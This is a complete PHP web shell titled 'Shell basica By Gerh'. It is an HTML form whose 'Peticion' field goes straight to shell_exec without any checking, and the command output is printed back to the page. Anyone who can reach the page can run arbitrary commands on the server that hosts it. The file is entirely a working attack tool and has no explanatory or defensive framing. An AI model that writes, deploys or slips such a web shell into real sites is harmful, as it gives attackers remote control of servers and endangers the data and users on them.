<!DOCTYPE html>
<html>
<head>
	<title>Shell basica By Gerh</title>
</head>
<body>
	<form action="Shell_Basica.php" method="POST">
		<input type="text" name="Peticion" id="Peticion"/>
		<input name="submit" type="submit" value="Command">
	</form>
	<?php
		if(isset($_REQUEST["submit"]))
		{
		$Peticion = $_REQUEST["Peticion"];
		$output = shell_exec("$Peticion");
		echo "<pre>$output</pre>\n";
		}
	?>
<script>document.getElementById("Peticion").focus();</script>
</body>
</html>
